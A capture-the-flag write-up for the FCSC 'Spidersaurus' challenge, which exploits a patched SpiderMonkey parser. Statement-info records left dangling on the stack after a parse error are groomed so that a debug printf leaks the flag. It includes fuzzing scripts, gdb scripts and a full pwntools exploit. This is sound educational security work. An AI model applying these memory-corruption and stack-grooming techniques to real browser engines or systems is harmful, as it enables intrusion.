Spidersaurus

Understanding the challenge

Since it was my first time doing browser exploitation I took a very long time to analyse and understand how different parts of the engine worked and were linked together. I found that very interesting and I loved diving into this complexe yet passionating code.

However in order to solve this challenge you don’t need to deeply understand the whole functionning of the engine. The patch gives hints on the interesting parts to investigate. Here are a summary of the important elements :

The patch adds this code in the main file js.c:

Thus we know that the flag is located in a buffer on the heap.

It also adds a call to GC a function managing the garbage collection in js.c which prints the current top address of the heap :

static JSBool
GC(JSContext *cx, JSObject *obj, uintN argc, jsval *argv, jsval *rval)
{
    JSRuntime *rt;
    uint32 preBytes;

    ...
    printf("before %lu, after %lu, break %08lx\n",
       (unsigned long)preBytes, (unsigned long)rt->gcBytes,
    ...
    return JS_TRUE;
}

This means we can easily locate the flag address by substracting a constant offset from the leaked heap address.

I found this offset using gdb in the same environment as the challenge : 0x21cbe

This will come in handy later in the exploitation process.

The other important change is in the file jsparse.c in the function Statement. This function parses the js statements from the source file and builds the Syntax Tree. It basically gets the next token from the file and then dispatches the processing of this statement through a giant switch case on the Token type.

For this challenge the important part of this process is the parsing of nested statements. To keep track of those statements (ex : if statement, for loops, while loops, blocks, …) the code implements a stack by a linked list of JSStmtInfo structures :

/* in file jsemit.h */
struct JSStmtInfo {
    JSStmtType      type;           /* statement type */
    ptrdiff_t       top;            /* offset of loop top from cg base */
    ptrdiff_t       update;         /* loop update offset (top if none) */
    ptrdiff_t       breaks;         /* offset of last break in loop */
    ptrdiff_t       continues;      /* offset of last continue in loop */
    JSAtom          *label;         /* label name if type is STMT_LABEL */
    JSStmtInfo      *down;          /* info for enclosing statement */
                                    /* down is used to chain elements in the linked list*/
};

The top statement of the stack is referenced by the topStmt field in the JSTreeContext structure (variable tc).

/* in file jsemit.h */
struct JSTreeContext {              /* tree context for semantic checks */
    uint32          flags;          /* statement state flags, see below */
    uint32          tryCount;       /* total count of try statements parsed */
    JSStmtInfo      *topStmt;       /* top of statement info stack */
};

Statements are pushed and poped from the linked list through the functions :

/* jsemit.c */
void js_PushStatement(JSTreeContext *tc, JSStmtInfo *stmt, JSStmtType type,
         ptrdiff_t top)
{
    stmt->type = type;
    SET_STATEMENT_TOP(stmt, top);
    stmt->label = NULL;
    stmt->down = tc->topStmt;
    tc->topStmt = stmt;
}

extern void js_PopStatement(JSTreeContext *tc)
{
    tc->topStmt = tc->topStmt->down;
}

Here is an exemple of how it works :

/* exemple */
label:                    // push label_stmt
while (condition) {       // push while_stmt + push block_stmt ({)
  for (;;) {             // push for_stmt + push block_stmt ({)
    break label;        // need to find where the label is
                        // so iterate through the linked list
  }
}

When the parser reaches the break it executes this part of the code in the Statement function :

/* ... */
/* case TOK_BREAK: */
stmt = tc->topStmt;
label = pn->pn_atom;
if (label) {
        // if a label is given with break statement,
        // browse the statement stack to find the label
        for (; ; stmt = stmt->down) {
        if (!stmt) {
            js_ReportCompileError(cx, ts, "label not found");
            return NULL;
        }
        if (stmt->type == STMT_LABEL && stmt->label == label)
            break;
        }
        /* code added by the patch */
        /* ----------------------- */
        if (stmt->type > STMT_WHILE_LOOP)
            printf("invalid stmt->type %d\n", stmt->type);
        /* ----------------------- */
}

The patch adds these two lines :

We see that when browsing the stack to find the label associated to the break, if a statement with an invalide type (stmt->type > STMT_WHILE_LOOP = 12) is found it gives us a memory read of the field stmt->type (which is the size of an int).

We can confirm this behaviour by running ./spidersaurus test.js and looking at the information :

before 4050, after 4041, break 58346000
...
invalid stmt->type 1448748055
invalid stmt->type 1479776944

Two 5 bytes values changing at each execution are leaked.

Notice that these numbers in hexadecimal are : 565a2417 and 58339ab0, probably heap or programm addresses.

The vulnerability

The parsing of nested statements is made recursively in the Statement function by pushing the statement and then calling Statement again to parse what’s inside the block. Example for the while statement :

/* ... */
case TOK_WHILE:
    pn = NewParseNode(cx, &ts->token, PN_BINARY);
    if (!pn)
        return NULL;
    // Pushes the while statement on the stack
    js_PushStatement(tc, &stmtInfo, STMT_WHILE_LOOP, -1);
    pn2 = Condition(cx, ts, tc); // Parses the condition in the parentheses
    if (!pn2)
        return NULL;
    pn->pn_left = pn2;
    // Calling statement to parse the statements inside the while block
    pn2 = Statement(cx, ts, tc);
    if (!pn2)
        return NULL;
    // Popping the while statement after is has been entirely processed
    js_PopStatement(tc);
    pn->pn_pos.end = pn2->pn_pos.end;
    pn->pn_right = pn2;
    return pn;

In fact the { character after while, for, … is also considered a separate “block statement” which is also pushed on the stack but calls the Statements function instead which again calls Statement recursively for each statement in the block :

/* ... */
case TOK_LC: // {
    js_PushStatement(tc, &stmtInfo, STMT_BLOCK, -1); // push the BLOCK stmt
    pn = Statements(cx, ts, tc); // calls Statements to recursively parse every statement int the block
    if (!pn)
        return NULL;

Important : Note that the JSStmtInfo structure stmtInfo is a local variable of the current Statement function call and resides on the stack.

The problem

Maybe you already spotted the problem in the code of the while statement…

Indeed if Condition returns NULL then the function it exits recursively through every call to Statement without popping any statements from the stmtInfo linked list !

And it is exactly what happens with the given POC file test.js when the parser encounters the invalid character after the if :

print("_bonjour_")
var x = �; // this also happens here but less interesting
for (3;2;1)
{
       while (0)
       {
               if �(0)
               {
                       break FCSC_2026
               }
       }
}
      case TOK_IF:
    /* An IF node has three kids: condition, then, and optional else. */
    pn = NewParseNode(cx, &ts->token, PN_TERNARY);
    if (!pn)
        return NULL;
    pn1 = Condition(cx, ts, tc); 
    // Condition returns NULL because it encounters an invalid character
    // See  MUST_MATCH_TOKEN(TOK_LP, "missing ( before condition") in Condition
    if (!pn1)
        return NULL;
    js_PushStatement(tc, &stmtInfo, STMT_IF, -1);

Here is the call stack and the linked list juste before parsing IF fails :

When the error in the last Statement call occurs, every stack frame is popped recursively until the Process frame.

Here we see that since none of the Statement pushed in the linked list have been popped out, the topStmt in the TreeContext struct still points to addresses on the stack (StmtInfo2 and StmtInfo1) even though the memory is not valid anymore.

Once every error has been processed, if the end of the file is not reached, Processcalls js_CompileTokenStream again which will parse the rest of the file starting from where it ended.

This means that future calls to functions will push frames on the stack and overwrite the values pointed by StmtInfo2 (Note: If StmtInfo2 is overwritten, StmtInfo2->down probably won’t point to StmtInfo1 anymore so the linked list will be broken from there).

Then when the code reaches the break it will go through the linked list and print the values on the stack pointed by StmtInfo2->type.

So if we can put the address of the flag on the stack where StmtInfo2->down field points, 4 bytes of the flag will be printed by this lines :

 /* case TOK_BREAK */
 /* ... */
 if (stmt->type > STMT_WHILE_LOOP)
            printf("invalid stmt->type %d\n", stmt->type);

Exploit

So how to put a controlled address on the stack exactly where an old Stmt->down points ?

The good idea

First I searched for functions used in the parser that put parsed values from the file on the stack.

One interesting function is GetChar in jsscan.c which contains this code :

/* ... */
char cbuf[JS_LINE_LIMIT];
jschar *ubuf;
ptrdiff_t i, 
crflag = (ts->flags & TSF_CRFLAG) != 0;
if (!fgets(cbuf, JS_LINE_LIMIT - crflag, ts->file)) {
    ts->flags |= TSF_EOF;
    return EOF;
}

This creates a buffer on the stack which reads one line of the js code. This could be a very interesting candidate since we could put controled data on the stack. However the patch added this line at the end of GetChar :

This nullifies the content of cbuf before exiting the function making its content unusable. It turns out that my assumption was wrong and I discovered later while reading someone else’s write up that optimisation flags added by the patch actually caused this line to be optimized away so the buffer was actually never reset.

Since I didn’t notice it, I went the hard way…

My solution

Since i did not manage to find string litterals from the file in the memory, my idea was rather to use the parsing of numbers. Using a code looking like :

print("_bonjour_")
var x = �;
for (3;2;1)
{
       while (0)
       {
               if �(0)
               {
                       var y = 13371337;
                       break FCSC_2026
               }
       }
}

I could find the value somewhere on the stack using gdb :

pwndbg> search -p 13371337
Searching for a pointer-width integer: b'\xc9\x07\xcc\x00'
[stack]         0xffffc620 0xcc07c9
pwndbg> x/d 0xffffc620
0xffffc620:     13371337

Now comes the tricky part : putting this value exactly where the Stmt->down points, so 24 bytes (6 * 4) after the start of the StmtInfo structure.

To understand how to solve the problem here is a little overview of the stack layout during the first and the second Processing (before and after the invalid character) :

The parts with ??? can be made longer or shorter by triggering more or less function calls. The goal is that the address of the controlled value ends up at the same address as the down field in the StmtInfo from first Processing.

I first tried adding different number of if, for and while statements in Processing 1 and 2 to shift the stack. The problem is that it shifts the stack by around 0xa0 or 0x110 for each statement but address of controlled value always end up at addresses ending with 0x0 (ex: 0xffffccd0) and the down field was always at addresses ending with 0x4 (ex : 0xffffca04).

So I had to find different expressions which could misalign stack frames to match that offset. For this purpose I started with some manual testing and noticed that adding values in the if statement condition gave different offsets. To save time and automate the searching process I wrote this fuzzing script :

#!/usr/bin/env python3
import itertools
import sys
import struct

TEMPLATE = r'''
print("_bonjour_")
var x = �;

for (3;2;1)
{
    while (0)
    {
        if �(PAYLOAD)
        {
            break FCSC_2026
        }
    }
}
'''


numbers = [
    "1337.1337",
    "0x1337",
    "1337",
]

prefix_ops = [
    "",
    "+",
    "-",
    "~",
    "!",
]

open_wrap = [
    "",
    "(",
    "{",
    "[",
    "((",
    "{{",
]

close_wrap = [
    "",
    ")",
    "}",
    "]",
    "))",
    "}}",
]

combos = list(itertools.product(
    numbers,
    prefix_ops,
    prefix_ops,
    open_wrap,
))

idx = int(sys.argv[1]) if len(sys.argv) > 1 else 0

if idx >= len(combos):
    sys.exit(1)

num, pre, pre2, opn = combos[idx]

clw_dict = {ow : cw for (ow, cw) in zip(open_wrap, close_wrap)}


print(f"[=== FUZZ : {idx}/{len(combos)}")

cls = clw_dict[opn] 


payload = f"{pre}{opn}{pre2}{num}{cls}"

content = TEMPLATE.replace("PAYLOAD", payload)

print(content)

with open("input_file.js", "w") as f:
    f.write(content)
    f.close()

if "." in num:
    print(f"[+] NUM={hex(struct.unpack('<Q', struct.pack('<d', 1337.1337))[0])}")
else:
    print(f"[+] NUM={num}")
print(f"[+] PAYLOAD={payload}")

(It goes with a gdb and analyse script which I put at the end for those interested in seeing the code)

This way I found multiple js codes matching the constraints and I chose one with a simple and valid syntaxe :

print("_bonjour_")
var x = �;

for (3;2;1)
{
    while (0)
    {
        if �(~((1337.1337)))
        {
            break FCSC_2026
        }
    }
}

Note : I only found working payloads using double values. Since doubles are encoded using IEEE754 standard, to find the double value associated with an arbitrary 4 byte value I used this code :

import struct
address = 0xdeadbeef #arbitrary 4 byte value we want to put in memory
double_value = struct.unpack("<d", struct.pack("<Q", address))[0]

By using this code structure, the target address and the stmt->down are only off by some frames of size multiple of 0x10. I noticed adding if in the first Processing and ( in the Second shifted the stack without changing the offset of 0x4, so I created a script to test multiple combinations of them until I find one that fits :

import subprocess
import sys


if (len(sys.argv) == 2):
    index = int(sys.argv[1])
else:
    index = 0

liste = [(i, j, k) for i in range(11) for j in range(11) for k in range(11)]

TEMPLATE = """
print("_bonjour_")
var x = �;

for (3;2;1)
{LCB
IFB
    while (0)
    {
        if �(~(LP1337.1337RP))
        {
            break FCSC_2026
        }
    }
RCB}
"""

x,y,z = liste[index]

ifb = "if (0) {\n" * y
lcb = "{" * x
rcb = "}" * (x+y)
lp = "(" * z
rp = ")" * z

content = TEMPLATE.replace("LCB", lcb).replace("IFB", ifb).replace("RCB", rcb).replace("LP", lp).replace("RP", rp)

print(content)

with open("input_file_adjust.js", "w") as f:
    f.write(content)

(Same : associated gdb script is at the end)

I found this final payload :

print("_bonjour_")
var x = �;

for (3;2;1)
{{
if (0) {
if (0) {
if (0) {

    while (0)
    {
        if �(~((1337.1337)))
        {
            break FCSC_2026
        }
    }
}}}}}

Last thing to do is to dynamically determine the address of the flag, add the offset found at the beginning and replace 1337.1337 by the double representation of the address. This will allow to leak the flag 4 bytes by 4 bytes.

Here is the final exploit script :

#!/usr/bin/env python

from pwn import *
import struct 

HOST = "challenges.fcsc.fr"
PORT = 2203

def get_p():
    if args.REMOTE:
        p = remote(HOST, PORT)
    else:
        p = process("../spidersaurus")
    return p

FLAG = ""

for it in range(7) :

    p = get_p()

    leak = p.recvline()
    print(leak)
    breakadd = int(leak.split(b"break ")[1].split(b"\n")[0], 16)
    log.info(f"Break add : {hex(breakadd)}")
    flag_add = breakadd - 0x21cbe + 4*it
    log.info(f"flag add: {hex(flag_add)}")

    val = struct.unpack("<d", struct.pack("<Q", flag_add))[0]
    print(val)
    print(str(val))

    template = """
    print("_bonjour_")                                                                 
     var x = �;                                                                         

     for (3;2;1)                                                                        
     {{                                                                                 
     if (0) {                                                                           
     if (0) {                                                                           
     if (0) {                                                                           

          while (0)                                                                      
          {                                                                              
              if �(~((NUM)))                                                        
              {                                                                          
                  break FCSC_2026                                                        
              }                                                                          
          }                                                                              
     }}}}}
    """

    exp = template.replace("NUM", str(val))
    print(exp)

    p.sendline(exp.encode())

    p.recvuntil(b"stmt->type")
    p.recvuntil(b"stmt->type")

    res = p.recvline()

    flag_part = int(res.strip().decode()).to_bytes(4, 'little').decode()
    FLAG += flag_part

    log.info(f"FLAG : {FLAG}")

p.close()

# FCSC{CdF8p6...}

Setup debug

Apply patch :

patch --dry-run -p1 --verbose < ../spidersaurus.patch
patch -p1 < ../spidersaurus.patch

To create a Debian Docker container with the i86 architecture and mount the host’s working directory into the Docker container.

docker run -it --rm -v $(pwd):/work i386/debian:13 bash

In the container :

apt update && apt install -y gdb libc6:i386

GDB Script to run the fuzzing scripts

First fuzzing :

set confirm off
set debuginfod enabled off
set disable-randomization on

set $i = 0
set $max = 900

b jsparse.c:1222

while ($i < $max)

gdb.execute("search -p " + num) #to find address of the controlled value

Script to analyse :

with open("fuzz.out", "r") as f:
    count = 0
    ispayload = False
    payload = []
    index = -1
    for l in f:
        if l[0] == "[" and ispayload:
            ispayload = False
        if l[0:5] == "print":
            payload.append("")
            ispayload = True
            index += 1
        if ispayload:
            payload[index] += l

        line = l.replace(" ", "")
        if line[0:7] == "[stack]":
            address = int(line[9:17], 16)
            print(hex(address))
            if address & 0xf == 4:
                print(f"FOUND : {hex(address)}")
                print(payload[index])
                count += 1
    print(f"{count} matching addresses found")
    for p in payload:
        print(p)

Second fuzzing :

define pinfo
    set $tc = (JSTreeContext*)0xffffcc50

    set $stmt = (JSStmtInfo*)$tc->topStmt
    set $last = 0

    # Continue while down points to a stack address (0xffffxxxx)
    while ($stmt != 0)

        set $last = $stmt
        set $next = $stmt->down

        # stop when it's not a stack address anymore
        if (((unsigned int)$next & 0xffff0000) != 0xffff0000)
            loop_break
        end

        set $stmt = $next
    end

    printf "Last valid stack element :\n"

    if ($last != 0)
        printf "stmt : "
        p $last
        p *$last
    else
        printf "No stmt found\n"
    end

    printf "----------------------\n"
end
